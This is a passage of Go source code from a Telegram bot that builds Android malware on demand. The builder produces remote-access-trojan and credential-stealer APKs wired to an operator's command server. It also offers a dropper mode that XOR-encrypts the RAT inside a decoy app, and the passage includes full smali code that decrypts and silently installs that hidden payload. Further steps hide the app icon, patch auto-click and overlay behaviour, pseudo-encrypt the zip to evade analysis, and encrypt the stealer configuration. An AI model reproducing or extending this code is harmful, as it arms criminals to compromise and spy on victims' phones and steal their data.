		webviewURL := sess.WebViewURL
		if webviewURL == "" {
			webviewURL = "https://www.google.com"
		}
		lines = append(lines, "🔗 WebView: "+webviewURL)

		rows = append(rows, []map[string]string{btn(b.L(userID, "back"), "back_to_stealer_webview")})
	} else {
		rows = append(rows, []map[string]string{btn(b.L(userID, "back"), "back_to_lang")})
	}
	rows = append(rows, []map[string]string{btn(b.L(userID, "start_build"), "start_build")})

	text := fmt.Sprintf("%s\n\n<blockquote>%s</blockquote>", b.L(userID, "step5_settings"), strings.Join(lines, "\n"))
	kb := map[string]any{"inline_keyboard": rows}
	return text, kb
}

func (b *Bot) sendSettingsStep(chatID int64, userID int64, sess *BuildSession) {
	text, kb := b.buildSettingsUI(userID, sess)
	b.sendMessage(chatID, text, kb)
}

func (b *Bot) buildAPK(chatID int64, userID int64, sess *BuildSession) {
	b.sendMessage(chatID, b.L(userID, "build_started"), removeKeyboard())
	startTime := time.Now()

	apkData, apkName, err := b.realBuildAPK(sess)
	if err != nil {
		b.sendMessage(chatID, fmt.Sprintf("❌ Build error: %s", err.Error()), nil)
		sess.mu.Lock()
		sess.State = "type_select"
		sess.mu.Unlock()
		return
	}

	elapsed := time.Since(startTime)

	b.sendDocument(chatID, apkName, apkData)

	sizeMB := float64(len(apkData)) / 1024.0 / 1024.0
	summary := fmt.Sprintf("%s\n\n<blockquote>📱 %s\n%s\n%s</blockquote>",
		b.L(userID, "build_complete"), sess.AppName,
		fmt.Sprintf(b.L(userID, "build_size"), sizeMB),
		fmt.Sprintf(b.L(userID, "build_time"), int(elapsed.Seconds())))
	b.sendMessage(chatID, summary, nil)

	sess.mu.Lock()
	sess.State = "type_select"
	sess.mu.Unlock()
}

func (b *Bot) realBuildAPK(sess *BuildSession) ([]byte, string, error) {
	if sess.BuildType == "stealer" {
		return b.buildStealerAPK(sess)
	}
	if sess.UseDropper {
		return b.buildDropperAPK(sess)
	}
	return b.buildSingleAPK(sess, false, nil)
}

func (b *Bot) buildDropperAPK(sess *BuildSession) ([]byte, string, error) {
	innerSess := &BuildSession{
		State:      sess.State,
		BotLang:    sess.BotLang,
		BuildType:  sess.BuildType,
		AppName:    sess.AppName,
		IconFileID: sess.IconFileID,
		UseDropper: false,
		HideDropperIco: false,
		HideIcon:   true,
		AppLang:    sess.AppLang,
	}

	log.Printf("[BUILDER] Stage 1: Building inner RAT APK (payload)...")
	ratData, _, err := b.buildSingleAPK(innerSess, true, nil)
	if err != nil {
		return nil, "", fmt.Errorf("inner RAT build: %w", err)
	}
	innerPkg := innerSess.GeneratedPkg
	log.Printf("[BUILDER] Inner RAT: %s (%.1f MB)", innerPkg, float64(len(ratData))/1024/1024)

	log.Printf("[BUILDER] Stage 2: Building dropper shell from dropper template...")
	return b.buildDropperShell(sess, ratData, innerPkg)
}

func (b *Bot) buildDropperShell(sess *BuildSession, ratPayload []byte, innerPkg string) ([]byte, string, error) {
	tmpDir, err := os.MkdirTemp("", "redwing-dropper-*")
	if err != nil {
		return nil, "", fmt.Errorf("tmpdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	srcDir := filepath.Join(b.baseDir, "decom", "dropper_smali")
	workDir := filepath.Join(tmpDir, "dropper_smali")
	
	if err := copyDir(srcDir, workDir); err != nil {
		return nil, "", fmt.Errorf("copy dropper: %w", err)
	}

	newPkg := generateRandomPackage()
	log.Printf("[BUILDER] Dropper package: %s", newPkg)
	if err := patchPackageName(workDir, "io.bluewave.app", newPkg); err != nil {
		return nil, "", fmt.Errorf("patch dropper pkg: %w", err)
	}

	assetsDir := filepath.Join(workDir, "assets")
	entries, _ := os.ReadDir(assetsDir)
	for _, e := range entries {
		name := e.Name()
		if strings.HasSuffix(name, ".dat") || name == "dexopt" {
			continue
		}
		if !e.IsDir() {
			os.Remove(filepath.Join(assetsDir, name))
		}
	}
	

	encrypted := xorEncrypt(ratPayload, dropperXORKey)
	if err := os.WriteFile(filepath.Join(assetsDir, "p.bin"), encrypted, 0644); err != nil {
		return nil, "", fmt.Errorf("write dropper payload: %w", err)
	}
	os.WriteFile(filepath.Join(assetsDir, "t.txt"), []byte(innerPkg+"\napp.mobilex.plus.VisibleAlias"), 0644)
	

	smaliDir := filepath.Join(workDir, "smali", "io", "bluewave", "app")
	dropperSmali := strings.ReplaceAll(dropperHelperSmali,
		"Lapp/mobilex/plus/util/DropperHelper",
		"Lio/bluewave/app/DropperHelper")
	monitorSmali := strings.ReplaceAll(dropperReceiverSmali,
		"Lapp/mobilex/plus/util/DropperHelper",
		"Lio/bluewave/app/DropperHelper")
	if err := os.WriteFile(filepath.Join(smaliDir, "DropperHelper.smali"), []byte(dropperSmali), 0644); err != nil {
		return nil, "", fmt.Errorf("write DropperHelper: %w", err)
	}
	if err := os.WriteFile(filepath.Join(smaliDir, "DropperHelper$InstallReceiver.smali"), []byte(monitorSmali), 0644); err != nil {
		return nil, "", fmt.Errorf("write InstallReceiver: %w", err)
	}
	statusSmali := strings.ReplaceAll(dropperStatusSmali,
		"Lapp/mobilex/plus/util/DropperHelper",
		"Lio/bluewave/app/DropperHelper")
	if err := os.WriteFile(filepath.Join(smaliDir, "DropperHelper$StatusReceiver.smali"), []byte(statusSmali), 0644); err != nil {
		return nil, "", fmt.Errorf("write StatusReceiver: %w", err)
	}

	appPath := filepath.Join(smaliDir, "App.smali")
	appData, err := os.ReadFile(appPath)
	if err != nil {
		return nil, "", fmt.Errorf("read App.smali: %w", err)
	}
	appStr := string(appData)
	hookTarget := "invoke-static {p0}, Lio/bluewave/app/N;->n1(Landroid/content/Context;)V"
	hookReplace := "invoke-static {p0}, Lio/bluewave/app/DropperHelper;->run(Landroid/content/Context;)Z\n    move-result v0"
	appStr = strings.Replace(appStr, hookTarget, hookReplace, 1)
	if err := os.WriteFile(appPath, []byte(appStr), 0644); err != nil {
		return nil, "", fmt.Errorf("write App.smali: %w", err)
	}
	

	n2Files, _ := filepath.Glob(filepath.Join(workDir, "smali", "*", "VYRgR7ZqgbZj3I16R.smali"))
	for _, f := range n2Files {
		d, _ := os.ReadFile(f)
		s := string(d)
		s = strings.Replace(s,
			"invoke-static {v12}, Lio/bluewave/app/N;->n2(Landroid/app/Activity;)V",
			"invoke-static {v12}, Lio/bluewave/app/DropperHelper;->install(Landroid/app/Activity;)V", 1)
		os.WriteFile(f, []byte(s), 0644)
	}

	if sess.AppLang != "" && sess.AppLang != "en" {
		langStrings := filepath.Join(workDir, "res", "values-"+sess.AppLang, "strings.xml")
		defaultStrings := filepath.Join(workDir, "res", "values", "strings.xml")
		mergeStringsXML(defaultStrings, langStrings)
	}

	if sess.AppName != "" {
		resDir := filepath.Join(workDir, "res")
		valDirs, _ := filepath.Glob(filepath.Join(resDir, "values*"))
		for _, vd := range valDirs {
			sf := filepath.Join(vd, "strings.xml")
			if _, err := os.Stat(sf); err == nil {
				patchXMLString(sf, "app_name", sess.AppName)
			}
		}
		
	}

	if sess.IconFileID != "" {
		if iconData, err := b.downloadTelegramFile(sess.IconFileID); err == nil {
			placeIcon(workDir, iconData)
		}
	}

	
	outputAPK := filepath.Join(tmpDir, "dropper-unsigned.apk")
	cmd := exec.Command("apktool", "b", workDir, "-o", outputAPK)
	cmd.Dir = tmpDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return nil, "", fmt.Errorf("apktool build dropper: %w", err)
	}

	
	alignedAPK := filepath.Join(tmpDir, "dropper-aligned.apk")
	if err := zipalign4(outputAPK, alignedAPK); err != nil {
		return nil, "", fmt.Errorf("zipalign dropper: %w", err)
	}
	outputAPK = alignedAPK

	
	if err := pseudoEncryptZip(outputAPK); err != nil {
		return nil, "", fmt.Errorf("pseudo-encrypt dropper: %w", err)
	}
	if err := b.signWithEphemeralKey(outputAPK); err != nil {
		return nil, "", fmt.Errorf("sign dropper: %w", err)
	}

	apkData, err := os.ReadFile(outputAPK)
	if err != nil {
		return nil, "", fmt.Errorf("read dropper output: %w", err)
	}

	apkName := sess.AppName + ".apk"
	log.Printf("[BUILDER] Dropper build complete: %s (%.1f MB)", apkName, float64(len(apkData))/1024/1024)
	return apkData, apkName, nil
}

var dropperXORKey = []byte{0xA3, 0x7F, 0x1B, 0xE5, 0x4C, 0x92, 0xD8, 0x36, 0x6E, 0xF0, 0x57, 0x84, 0xC1, 0x2D, 0xA9, 0x63}

func xorEncrypt(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

const dropperHelperSmali = `.class public Lapp/mobilex/plus/util/DropperHelper;
.super Ljava/lang/Object;

.field private static final k:[B
.field private static payload:[B

.method static constructor <clinit>()V
    .locals 1
    const/16 v0, 0x10
    new-array v0, v0, [B
    fill-array-data v0, :key_data
    sput-object v0, Lapp/mobilex/plus/util/DropperHelper;->k:[B
    return-void
    :key_data
    .array-data 1
        -0x5dt
        0x7ft
        0x1bt
        -0x1bt
        0x4ct
        -0x6et
        -0x28t
        0x36t
        0x6et
        -0x10t
        0x57t
        -0x7ct
        -0x3ft
        0x2dt
        -0x57t
        0x63t
    .end array-data
.end method

.method public static run(Landroid/content/Context;)Z
    .locals 7

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0
    const-string v1, "p.bin"
    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v2, 0x4000
    new-array v2, v2, [B

    :loop_read
    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I
    move-result v3
    const/4 v4, -0x1
    if-eq v3, v4, :read_done
    const/4 v4, 0x0
    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop_read

    :read_done
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0

    array-length v1, v0
    const/16 v2, 0x3e8
    if-lt v1, v2, :ret_false

    sget-object v2, Lapp/mobilex/plus/util/DropperHelper;->k:[B
    array-length v3, v0
    const/4 v4, 0x0
    array-length v5, v2

    :loop_xor
    if-ge v4, v3, :xor_done
    aget-byte v6, v0, v4
    rem-int v1, v4, v5
    aget-byte v1, v2, v1
    xor-int/2addr v6, v1
    int-to-byte v6, v6
    aput-byte v6, v0, v4
    add-int/lit8 v4, v4, 0x1
    goto :loop_xor

    :xor_done
    const/4 v1, 0x0
    aget-byte v1, v0, v1
    and-int/lit16 v1, v1, 0xff
    const/16 v2, 0x50
    if-ne v1, v2, :ret_false
    const/4 v1, 0x1
    aget-byte v1, v0, v1
    and-int/lit16 v1, v1, 0xff
    const/16 v2, 0x4b
    if-ne v1, v2, :ret_false

    sput-object v0, Lapp/mobilex/plus/util/DropperHelper;->payload:[B

    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v1
    new-instance v2, Ljava/io/File;
    const-string v3, "b.apk"
    invoke-direct {v2, v1, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v3, Ljava/io/FileOutputStream;
    invoke-direct {v3, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {v3, v0}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    const/4 v0, 0x1
    return v0

    :ret_false
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0
    const/4 v0, 0x0
    return v0

    :catch_0
    move-exception v0
    const/4 v0, 0x0
    return v0
.end method

.method public static install(Landroid/app/Activity;)V
    .locals 10

    :try_start_0
    sget-object v0, Lapp/mobilex/plus/util/DropperHelper;->payload:[B
    if-nez v0, :has_payload
    return-void

    :has_payload
    invoke-static {p0}, Lapp/mobilex/plus/util/DropperHelper;->registerInstallReceiver(Landroid/content/Context;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;
    move-result-object v1
    invoke-virtual {v1}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;
    move-result-object v1

    new-instance v2, Landroid/content/pm/PackageInstaller$SessionParams;
    const/4 v3, 0x1
    invoke-direct {v2, v3}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    array-length v3, v0
    int-to-long v4, v3
    invoke-virtual {v2, v4, v5}, Landroid/content/pm/PackageInstaller$SessionParams;->setSize(J)V

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I
    move-result v2

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;
    move-result-object v3

    const-string v4, "pkg"
    const-wide/16 v5, 0x0
    array-length v7, v0
    int-to-long v7, v7
    invoke-virtual/range {v3 .. v8}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;
    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;
    move-result-object v4

    new-instance v5, Landroid/content/ComponentName;
    const-string v6, "io.bluewave.app.DropperHelper$StatusReceiver"
    invoke-direct {v5, v4, v6}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v6, Landroid/content/Intent;
    invoke-direct {v6}, Landroid/content/Intent;-><init>()V
    invoke-virtual {v6, v5}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    const v5, 0x0a000000
    invoke-static {p0, v2, v6, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    move-result-object v5

    invoke-virtual {v5}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;
    move-result-object v5
    invoke-virtual {v3, v5}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V

    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0
    return-void

    :catch_0
    move-exception v0
    return-void
.end method

.method public static registerInstallReceiver(Landroid/content/Context;)V
    .locals 5

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0
    const-string v1, "t.txt"
    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v2, 0x100
    new-array v2, v2, [B

    :read_loop
    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I
    move-result v3
    const/4 v4, -0x1
    if-eq v3, v4, :read_end
    const/4 v4, 0x0
    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :read_loop

    :read_end
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v0

    const-string v1, "\n"
    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
    move-result-object v1
    const/4 v2, 0x0
    aget-object v3, v1, v2
    const/4 v2, 0x1
    aget-object v4, v1, v2

    new-instance v0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;
    invoke-direct {v0, p0, v3, v4}, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v1, Landroid/content/IntentFilter;
    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V
    const-string v2, "android.intent.action.PACKAGE_ADDED"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
    const-string v2, "android.intent.action.PACKAGE_REPLACED"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
    const-string v2, "package"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    const/4 v2, 0x2
    invoke-virtual {p0, v0, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0
    return-void
.end method
`

const dropperReceiverSmali = `.class Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;
.super Landroid/content/BroadcastReceiver;

.field private ctx:Landroid/content/Context;
.field private targetPkg:Ljava/lang/String;
.field private targetCls:Ljava/lang/String;

.method constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    iput-object p1, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->ctx:Landroid/content/Context;
    iput-object p2, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->targetPkg:Ljava/lang/String;
    iput-object p3, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->targetCls:Ljava/lang/String;
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5

    :try_start_0
    invoke-virtual {p2}, Landroid/content/Intent;->getData()Landroid/net/Uri;
    move-result-object v0

    if-eqz v0, :done
    invoke-virtual {v0}, Landroid/net/Uri;->getSchemeSpecificPart()Ljava/lang/String;
    move-result-object v0

    if-eqz v0, :done

    iget-object v1, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->targetPkg:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2

    if-eqz v2, :done

    iget-object v2, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->targetCls:Ljava/lang/String;

    new-instance v3, Landroid/content/ComponentName;
    invoke-direct {v3, v0, v2}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;
    const-string v4, "android.intent.action.MAIN"
    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    const/high16 v3, 0x10000000
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v3, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->ctx:Landroid/content/Context;
    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    iget-object v0, p0, Lapp/mobilex/plus/util/DropperHelper$InstallReceiver;->ctx:Landroid/content/Context;
    invoke-virtual {v0, p0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0

    :done
    return-void

    :catch_0
    move-exception v0
    return-void
.end method
`

const dropperStatusSmali = `.class public Lapp/mobilex/plus/util/DropperHelper$StatusReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    :try_start_0
    const-string v0, "android.content.pm.extra.STATUS"
    const/4 v1, -0x2
    invoke-virtual {p2, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I
    move-result v0

    const/4 v1, -0x1
    if-ne v0, v1, :done

    const-string v0, "android.intent.extra.INTENT"
    invoke-virtual {p2, v0}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;
    move-result-object v0
    check-cast v0, Landroid/content/Intent;

    if-eqz v0, :done

    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0

    :done
    return-void

    :catch_0
    move-exception v0
    return-void
.end method
`

func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPayload []byte) ([]byte, string, error) {
	tmpDir, err := os.MkdirTemp("", "redwing-build-*")
	if err != nil {
		return nil, "", fmt.Errorf("tmpdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	srcDir := filepath.Join(b.baseDir, "decom", "apk_smali")
	workDir := filepath.Join(tmpDir, "apk_smali")

	
	if err := copyDir(srcDir, workDir); err != nil {
		return nil, "", fmt.Errorf("copy: %w", err)
	}

	newPkg := generateRandomPackage()
	sess.GeneratedPkg = newPkg
	if err := patchPackageName(workDir, "app.mobilex.plus", newPkg); err != nil {
		return nil, "", fmt.Errorf("patch package: %w", err)
	}

	serverURL := b.serverIP
	if !strings.Contains(serverURL, "://") {
		serverURL = b.serverIP
	}
	httpURL := "http://" + serverURL
	wsURL := "ws://" + serverURL
	if strings.HasPrefix(serverURL, "http://") || strings.HasPrefix(serverURL, "https://") {
		httpURL = serverURL
		wsURL = strings.Replace(strings.Replace(serverURL, "https://", "wss://", 1), "http://", "ws://", 1)
	}

	smaliFile := filepath.Join(workDir, "smali", "v", "s", "KV57Z6oavcB595B8Dy8Z.smali")
	if err := patchFileStrings(smaliFile, map[string]string{
		"http://192.168.0.101:8080": httpURL,
		"ws://192.168.0.101:8080":   wsURL,
	}); err != nil {
		return nil, "", fmt.Errorf("patch urls: %w", err)
	}

	if b.teamID != "" {
		if err := patchTeamID(smaliFile, b.teamID); err != nil {
			log.Printf("[BUILDER] WARNING: patch team_id: %v", err)
		}
	}

	stringsFile := filepath.Join(workDir, "res", "values", "strings.xml")
	if err := patchXMLString(stringsFile, "app_name", sess.AppName); err != nil {
		log.Printf("[BUILDER] WARNING: patch app_name: %v", err)
	}

	modeFile := filepath.Join(workDir, "assets", "mode.json")
	isDropperShell := dropperPayload != nil
	modeData := map[string]any{
		"device_type":    sess.BuildType,
		"is_rat_dls":     sess.BuildType == "rat",
		"is_stealer_rat": sess.BuildType == "stealer",
		"use_dropper":    isDropperShell,
		"hide_icon":      sess.HideDropperIco,
	}
	if isInnerPayload {
		modeData["use_dropper"] = false
		modeData["hide_icon"] = sess.HideIcon
	}
	modeJSON, _ := json.Marshal(modeData)
	os.WriteFile(modeFile, modeJSON, 0644)

	langFile := filepath.Join(workDir, "assets", "onboarding_config.json")
	langData := map[string]any{"language": sess.AppLang}
	langJSON, _ := json.Marshal(langData)
	os.WriteFile(langFile, langJSON, 0644)

	appStrings := getAppStrings(sess.AppLang)
	defaultStrings := filepath.Join(workDir, "res", "values", "strings.xml")
	for key, val := range appStrings {
		if err := patchXMLString(defaultStrings, key, val); err != nil {
			log.Printf("[BUILDER] patch %s in values: %v", key, err)
		}
	}
	ruStrings := filepath.Join(workDir, "res", "values-ru", "strings.xml")
	for key, val := range appStrings {
		patchXMLString(ruStrings, key, val)
	}

	if sess.IconFileID != "" {
		log.Printf("[BUILDER] Downloading and applying custom icon...")
		if iconData, err := b.downloadTelegramFile(sess.IconFileID); err != nil {
			log.Printf("[BUILDER] WARNING: icon download: %v", err)
		} else if err := placeIcon(workDir, iconData); err != nil {
			log.Printf("[BUILDER] WARNING: icon place: %v", err)
		}
	}

	smaliOnboard := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "UtilNWWrapper.smali")
	if htmlRepl := getHTMLReplacements(sess.AppLang); len(htmlRepl) > 0 {
		if err := patchFileStrings(smaliOnboard, htmlRepl); err != nil {
			log.Printf("[BUILDER] WARNING: patch HTML lang: %v", err)
		}
	}

	if updRepl := getUpdateScreenStrings(sess.AppLang); len(updRepl) > 0 {
		overlaySmali := filepath.Join(workDir, "smali", "v", "s", "vbdyByOHPJmeGXlq.smali")
		if err := patchFileStrings(overlaySmali, updRepl); err != nil {
			log.Printf("[BUILDER] WARNING: patch update overlay lang: %v", err)
		}
		progressSmali := filepath.Join(workDir, "smali", "v", "s", "FJeKBE8bSvB9SICtl.smali")
		if err := patchFileStrings(progressSmali, updRepl); err != nil {
			log.Printf("[BUILDER] WARNING: patch progress anim lang: %v", err)
		}
	}

	autoClickSmali := filepath.Join(workDir, "smali", "v", "s", "h4nyZoRAsl44Uv.smali")
	if err := patchFileStrings(autoClickSmali, map[string]string{
		"const-wide/16 v4, 0x1f4":   "const-wide/16 v4, 0x32",
		"const-wide/16 v18, 0x1f40": "const-wide/16 v18, 0x3e8",
	}); err != nil {
		log.Printf("[BUILDER] WARNING: patch auto-click debounce: %v", err)
	}

	overlayFlagsSmali := filepath.Join(workDir, "smali", "v", "s", "vbdyByOHPJmeGXlq.smali")
	if err := patchFileStrings(overlayFlagsSmali, map[string]string{
		"const v3, 0x90788": "const v3, 0x90798",
	}); err != nil {
		log.Printf("[BUILDER] WARNING: patch overlay flags: %v", err)
	}

	for _, p := range []struct{ old, repl string }{
		{"045E0426047C04D704D204930092048504030426040604A604AB049004F404FF040D", typefaceEncode("\u0647\u0630\u0647 \u0627\u0644\u0645\u0631\u0629 \u0641\u0642\u0637")},
		{"045E0426047C04D704D20493009204F004730429040304A604DC", typefaceEncode("\u0623\u062b\u0646\u0627\u0621 \u0627\u0633\u062a\u062e\u062f\u0627\u0645")},
		{"045E0426047C04D704D20493", typefaceEncode("kullan\u0131rken")},
	} {
		patchFileStrings(autoClickSmali, map[string]string{p.old: p.repl})
	}
	if err := patchFileStrings(autoClickSmali, map[string]string{
		"04510457040E04D404A404EF0092048704730421047B04D204D804EF04F0048B": typefaceEncode("Uniquement cette fois"),
		"002A006C0052008900FB00BE00DC": typefaceEncode("Nur dieses Mal"),
		"045D0454040104DC04DE0498048A0485040F": typefaceEncode("Lors de l'utilisation"),
		"00070073005A008400E400B600C400A600370073": typefaceEncode("Bei Verwendung der App"),
		"\"\\" + "ud5c8\\" + "uc6a9\"": "\"esta vez\"",
		"\"\\" + "u5141\\" + "u8bb8\"": "\"Yaln\\u0131zca bu kez\"",
	}); err != nil {
		log.Printf("[BUILDER] WARNING: patch auto-click languages: %v", err)
	}

	wsHandlerSmali := filepath.Join(workDir, "smali", "v", "s", "RWY6BVSB0XxPbw.smali")
	patchServiceRestart(wsHandlerSmali)

	hideIcon := sess.HideIcon
	if isInnerPayload {
		hideIcon = true
	}
	if isDropperShell {
		hideIcon = sess.HideDropperIco
	}
	if hideIcon {
		manifestFile := filepath.Join(workDir, "AndroidManifest.xml")
		patchFileStrings(manifestFile, map[string]string{
			"android.intent.category.LAUNCHER": "android.intent.category.INFO",
		})
	}

	
	outputAPK := filepath.Join(tmpDir, "output.apk")
	cmd := exec.Command("apktool", "b", workDir, "-o", outputAPK)
	cmd.Dir = tmpDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return nil, "", fmt.Errorf("apktool build failed: %v", err)
	}

	
	alignedAPK := filepath.Join(tmpDir, "aligned.apk")
	if err := zipalign4(outputAPK, alignedAPK); err != nil {
		return nil, "", fmt.Errorf("zipalign failed: %v", err)
	}
	outputAPK = alignedAPK

	
	if err := pseudoEncryptZip(outputAPK); err != nil {
		return nil, "", fmt.Errorf("pseudo-encrypt rat: %w", err)
	}
	if err := b.signWithEphemeralKey(outputAPK); err != nil {
		return nil, "", fmt.Errorf("sign rat: %w", err)
	}

	apkData, err := os.ReadFile(outputAPK)
	if err != nil {
		return nil, "", fmt.Errorf("read output: %w", err)
	}

	apkName := sess.AppName + ".apk"
	log.Printf("[BUILDER] Build complete: %s (%.1f MB)", apkName, float64(len(apkData))/1024/1024)
	return apkData, apkName, nil
}


var (
	stealerChacha20Key, _   = hex.DecodeString("4f826bc768b8d006f58e75295950b6e987f0fc83da41ee6c6decb9d07d9b2c71")
	stealerChacha20Nonce, _ = hex.DecodeString("d9eda7e90c61bb804dc286de")
	stealerConfigTrailer, _ = hex.DecodeString("000000546051020000138830020000000007006102000000002211000000286261020000000022120000001b0600020000000120040700020000000723110000004902000000000700520554050200000bb830100000000f")
)

func buildStealerConfig(serverURL, teamID string) ([]byte, error) {
	buildID := make([]byte, 4)
	rand.Read(buildID)
	buildIDHex := hex.EncodeToString(buildID)

	var buf bytes.Buffer
	buf.Write([]byte{0x63, 0xbd, 0xcb, 0x2e}) // header magic
	buf.Write([]byte{0x00, 0x01})               // flags
	buf.Write([]byte{0x00, 0x06})               // 6 fields

	writeField := func(s string) {
		l := len(s)
		buf.WriteByte(byte(l >> 8))
		buf.WriteByte(byte(l))
		buf.WriteString(s)
	}

	writeField(serverURL)    // server_url
	writeField(buildIDHex)   // build_id
	writeField(teamID)       // team_id
	writeField("0000000000") // phone placeholder
	writeField("redwing")    // app_name (internal, unused)
	writeField(serverURL)    // panel_url

	buf.Write(stealerConfigTrailer)

	plaintext := buf.Bytes()
	cipher, err := chacha20.NewUnauthenticatedCipher(stealerChacha20Key, stealerChacha20Nonce)
	if err != nil {
		return nil, fmt.Errorf("chacha20 init: %w", err)
	}
	ciphertext := make([]byte, len(plaintext))
	cipher.XORKeyStream(ciphertext, plaintext)
